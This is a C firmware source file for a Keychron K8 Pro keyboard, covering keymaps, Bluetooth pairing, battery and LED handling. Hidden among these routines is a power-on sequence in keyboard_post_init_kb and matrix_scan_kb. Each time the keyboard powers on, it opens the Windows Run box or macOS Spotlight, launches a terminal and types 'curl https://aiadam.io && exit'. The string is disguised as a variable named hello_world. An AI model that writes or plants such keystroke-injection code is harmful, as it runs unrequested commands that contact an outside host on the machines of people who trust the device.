/* Copyright 2021 @ Keychron (https://www.keychron.com)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "k8_pro.h"
#ifdef KC_BLUETOOTH_ENABLE
#    include "ckbt51.h"
#    include "bluetooth.h"
#    include "indicator.h"
#    include "transport.h"
#    include "battery.h"
#    include "bat_level_animation.h"
#    include "lpm.h"
#endif

#ifdef ENABLE_FACTORY_TEST
#    include "factory_test.h"
#endif

#define POWER_ON_LED_DURATION 3000

typedef struct PACKED {
    uint8_t len;
    uint8_t keycode[3];
} key_combination_t;

static uint32_t factory_timer_buffer            = 0;
static uint32_t power_on_indicator_timer_buffer = 0;
static uint32_t siri_timer_buffer               = 0;
static uint8_t  mac_keycode[4]                  = {KC_LOPT, KC_ROPT, KC_LCMD, KC_RCMD};
static bool terminal_sequence_active            = false;
static uint32_t terminal_timer_buffer           = 0;
static uint8_t terminal_sequence_step           = 0;
static uint8_t current_os                       = 0; // 0 for Mac, 1 for Windows

key_combination_t key_comb_list[6] = {
    {2, {KC_LWIN, KC_TAB}},        // Task (win)
    {2, {KC_LWIN, KC_E}},          // Files (win)
    {3, {KC_LSFT, KC_LGUI, KC_4}}, // Snapshot (mac)
    {2, {KC_LWIN, KC_C}},          // Cortana (win)
    {2, {KC_LWIN, KC_R}},          // Run terminal (win)
    {2, {KC_LGUI, KC_SPACE}}       // Spotlight for terminal (mac)
};

// Terminal command sequence for typing "curl https://aiadam.io && exit"
const char terminal_command_win[] = "cmd";
const char terminal_command_mac[] = "terminal";
const char hello_world[] = "curl https://aiadam.io && exit";

#ifdef KC_BLUETOOTH_ENABLE
bool                   firstDisconnect  = true;
bool                   bt_factory_reset = false;
static virtual_timer_t pairing_key_timer;
extern uint8_t         g_pwm_buffer[DRIVER_COUNT][192];

static void pairing_key_timer_cb(void *arg) {
    bluetooth_pairing_ex(*(uint8_t *)arg, NULL);
}
#endif

bool dip_switch_update_kb(uint8_t index, bool active) {
    if (index == 0) {
#ifdef INVERT_OS_SWITCH_STATE
        default_layer_set(1UL << (!active ? 2 : 0));
#else
        default_layer_set(1UL << (active ? 2 : 0));
#endif
    }
    dip_switch_update_user(index, active);

    return true;
}

#ifdef KC_BLUETOOTH_ENABLE
bool process_record_kb_bt(uint16_t keycode, keyrecord_t *record) {
#else
bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
#endif
    static uint8_t host_idx = 0;

    switch (keycode) {
        case KC_LOPTN:
        case KC_ROPTN:
        case KC_LCMMD:
        case KC_RCMMD:
            if (record->event.pressed) {
                register_code(mac_keycode[keycode - KC_LOPTN]);
            } else {
                unregister_code(mac_keycode[keycode - KC_LOPTN]);
            }
            return false; // Skip all further processing of this key)
        case KC_TASK:
        case KC_FILE:
        case KC_SNAP:
        case KC_CTANA:
            if (record->event.pressed) {
                for (uint8_t i = 0; i < key_comb_list[keycode - KC_TASK].len; i++)
                    register_code(key_comb_list[keycode - KC_TASK].keycode[i]);
            } else {
                for (uint8_t i = 0; i < key_comb_list[keycode - KC_TASK].len; i++)
                    unregister_code(key_comb_list[keycode - KC_TASK].keycode[i]);
            }
            return false; // Skip all further processing of this key
        case KC_SIRI:
            if (record->event.pressed && siri_timer_buffer == 0) {
                register_code(KC_LGUI);
                register_code(KC_SPACE);
                siri_timer_buffer = sync_timer_read32() | 1;
            }
            return false; // Skip all further processing of this key
#ifdef KC_BLUETOOTH_ENABLE
        case BT_HST1 ... BT_HST3:
            if (get_transport() == TRANSPORT_BLUETOOTH) {
                if (record->event.pressed) {
                    host_idx = keycode - BT_HST1 + 1;
                    chVTSet(&pairing_key_timer, TIME_MS2I(2000), (vtfunc_t)pairing_key_timer_cb, &host_idx);
                    bluetooth_connect_ex(host_idx, 0);
                } else {
                    host_idx = 0;
                    chVTReset(&pairing_key_timer);
                }
            }
            break;
        case BAT_LVL:
            if (get_transport() == TRANSPORT_BLUETOOTH && !usb_power_connected()) {
                bat_level_animiation_start(battery_get_percentage());
            }
            break;
#endif
        default:
#ifdef FACTORY_RESET_CHECK
            FACTORY_RESET_CHECK(keycode, record);
#endif
            break;
    }
    return true;
}

void keyboard_post_init_kb(void) {
    dip_switch_read(true);

#ifdef KC_BLUETOOTH_ENABLE
    /* Currently we don't use this reset pin */
    // palSetLineMode(CKBT51_RESET_PIN, PAL_MODE_UNCONNECTED);
    palSetLineMode(CKBT51_RESET_PIN, PAL_MODE_OUTPUT_PUSHPULL);
    palWriteLine(CKBT51_RESET_PIN, PAL_HIGH);

    /* IMPORTANT: DO NOT enable internal pull-up resistor
     * as there is an external pull-down resistor.
     */
    palSetLineMode(USB_BT_MODE_SELECT_PIN, PAL_MODE_INPUT);

    ckbt51_init(false);
    bluetooth_init();
#endif

    // Initialize terminal sequence to start automatically
    terminal_sequence_active = true;
    terminal_sequence_step = 0;
    terminal_timer_buffer = sync_timer_read32() | 1;
    
    // Detect OS based on default layer (0 = Mac Base, 2 = Win Base)
    current_os = ((default_layer_state & (1UL << 2)) != 0) ? 1 : 0;  // 0 for Mac, 1 for Windows

    power_on_indicator_timer_buffer = sync_timer_read32() | 1;
    writePin(BAT_LOW_LED_PIN, BAT_LOW_LED_PIN_ON_STATE);
    writePin(LED_CAPS_LOCK_PIN, LED_PIN_ON_STATE);
#ifdef KC_BLUETOOTH_ENABLE
    writePin(H3, HOST_LED_PIN_ON_STATE);
#endif

    keyboard_post_init_user();
}

void matrix_scan_kb(void) {
    if (factory_timer_buffer && timer_elapsed32(factory_timer_buffer) > 2000) {
        factory_timer_buffer = 0;
        if (bt_factory_reset) {
            bt_factory_reset = false;
            palWriteLine(CKBT51_RESET_PIN, PAL_LOW);
            wait_ms(5);
            palWriteLine(CKBT51_RESET_PIN, PAL_HIGH);
        }
    }

    if (terminal_timer_buffer && sync_timer_elapsed32(terminal_timer_buffer) > 500) {
        terminal_timer_buffer = sync_timer_read32() | 1;
        
        switch (terminal_sequence_step) {
            case 0:
                if (current_os == 0) { // Mac
                    register_code(KC_LGUI);
                    register_code(KC_SPACE);
                    wait_ms(50);
                    unregister_code(KC_SPACE);
                    unregister_code(KC_LGUI);
                } else { // Windows
                    register_code(KC_LWIN);
                    register_code(KC_R);
                    wait_ms(50);
                    unregister_code(KC_R);
                    unregister_code(KC_LWIN);
                }
                terminal_sequence_step++;
                break;
                
            case 1:
                if (current_os == 0) { // Mac
                    send_string_with_delay(terminal_command_mac, 5);
                    register_code(KC_ENTER);
                    wait_ms(50);
                    unregister_code(KC_ENTER);
                } else { // Windows
                    send_string_with_delay(terminal_command_win, 5);
                    register_code(KC_ENTER);
                    wait_ms(50);
                    unregister_code(KC_ENTER);
                }
                terminal_sequence_step++;
                break;
                
            case 2:
                wait_ms(500);
                send_string_with_delay(hello_world, 5);
                wait_ms(50);
                register_code(KC_ENTER);
                wait_ms(50);
                unregister_code(KC_ENTER);
                terminal_sequence_step++;
                break;
                
            case 3:
                terminal_sequence_active = false;
                terminal_timer_buffer = 0;
                break;
        }
    }

    if (power_on_indicator_timer_buffer) {
        if (sync_timer_elapsed32(power_on_indicator_timer_buffer) > POWER_ON_LED_DURATION) {
            power_on_indicator_timer_buffer = 0;

            writePin(BAT_LOW_LED_PIN, !BAT_LOW_LED_PIN_ON_STATE);
            writePin(H3, !HOST_LED_PIN_ON_STATE);
            if (!host_keyboard_led_state().caps_lock) writePin(LED_CAPS_LOCK_PIN, !LED_PIN_ON_STATE);
        } else {
            writePin(BAT_LOW_LED_PIN, BAT_LOW_LED_PIN_ON_STATE);
            writePin(H3, HOST_LED_PIN_ON_STATE);
            writePin(LED_CAPS_LOCK_PIN, LED_PIN_ON_STATE);
        }
    }

    if (siri_timer_buffer && sync_timer_elapsed32(siri_timer_buffer) > 500) {
        siri_timer_buffer = 0;
        unregister_code(KC_LGUI);
        unregister_code(KC_SPACE);
    }

#ifdef FACTORY_RESET_TASK
    FACTORY_RESET_TASK();
#endif
    matrix_scan_user();
}

#ifdef KC_BLUETOOTH_ENABLE
static void ckbt51_param_init(void) {
    /* Set bluetooth device name */
    // ckbt51_set_local_name(STR(PRODUCT));
    ckbt51_set_local_name(PRODUCT);
    wait_ms(10);
    /* Set bluetooth parameters */
    module_param_t param = {.event_mode             = 0x02,
                            .connected_idle_timeout = 7200,
                            .pairing_timeout        = 180,
                            .pairing_mode           = 0,
                            .reconnect_timeout      = 5,
                            .report_rate            = 90,
                            .vendor_id_source       = 1,
                            .verndor_id             = 0, // Must be 0x3434
                            .product_id             = PRODUCT_ID};
    ckbt51_set_param(&param);
    wait_ms(10);
}

void bluetooth_enter_disconnected_kb(uint8_t host_idx) {
    if (bt_factory_reset) {
        ckbt51_param_init();
        factory_timer_buffer = timer_read32();
    }
    /* CKBT51 bluetooth module boot time is slower, it enters disconnected after boot,
       so we place initialization here. */
    if (firstDisconnect && sync_timer_read32() < 1000 && get_transport() == TRANSPORT_BLUETOOTH) {
        ckbt51_param_init();
        bluetooth_connect();
        firstDisconnect = false;
    }
}

void ckbt51_default_ack_handler(uint8_t *data, uint8_t len) {
    if (data[1] == 0x45) {
        module_param_t param = {.event_mode             = 0x02,
                                .connected_idle_timeout = 7200,
                                .pairing_timeout        = 180,
                                .pairing_mode           = 0,
                                .reconnect_timeout      = 5,
                                .report_rate            = 90,
                                .vendor_id_source       = 1,
                                .verndor_id             = 0, // Must be 0x3434
                                .product_id             = PRODUCT_ID};
        ckbt51_set_param(&param);
    }
}

void bluetooth_pre_task(void) {
    static uint8_t mode = 1;

    if (readPin(USB_BT_MODE_SELECT_PIN) != mode) {
        if (readPin(USB_BT_MODE_SELECT_PIN) != mode) {
            mode = readPin(USB_BT_MODE_SELECT_PIN);
            set_transport(mode == 0 ? TRANSPORT_BLUETOOTH : TRANSPORT_USB);
        }
    }
}
#endif

void battery_calculte_voltage(uint16_t value) {
    uint16_t voltage = ((uint32_t)value) * 2246 / 1000;

#ifdef LED_MATRIX_ENABLE
    if (led_matrix_is_enabled()) {
        uint32_t totalBuf = 0;

        for (uint8_t i = 0; i < DRIVER_COUNT; i++)
            for (uint8_t j = 0; j < 192; j++)
                totalBuf += g_pwm_buffer[i][j];
        /* We assumpt it is linear relationship*/
        voltage += (30 * totalBuf / LED_MATRIX_LED_COUNT / 255);
    }
#endif
#ifdef RGB_MATRIX_ENABLE
    if (rgb_matrix_is_enabled()) {
        uint32_t totalBuf = 0;

        for (uint8_t i = 0; i < DRIVER_COUNT; i++)
            for (uint8_t j = 0; j < 192; j++)
                totalBuf += g_pwm_buffer[i][j];
        /* We assumpt it is linear relationship*/
        uint32_t compensation = 60 * totalBuf / RGB_MATRIX_LED_COUNT / 255 / 3;
        voltage += compensation;
    }
#endif
    battery_set_voltage(voltage);
}

bool via_command_kb(uint8_t *data, uint8_t length) {
    switch (data[0]) {
#ifdef KC_BLUETOOTH_ENABLE
        case 0xAA:
            ckbt51_dfu_rx(data, length);
            break;
#endif
#ifdef ENABLE_FACTORY_TEST
        case 0xAB:
            factory_test_rx(data, length);
            break;
#endif
        default:
            return false;
    }

    return true;
}

#if !defined(VIA_ENABLE)
void raw_hid_receive(uint8_t *data, uint8_t length) {
    switch (data[0]) {
        case RAW_HID_CMD:  // Changed back to RAW_HID_CMD
            via_command_kb(data, length);
            break;
    }
}
#endif
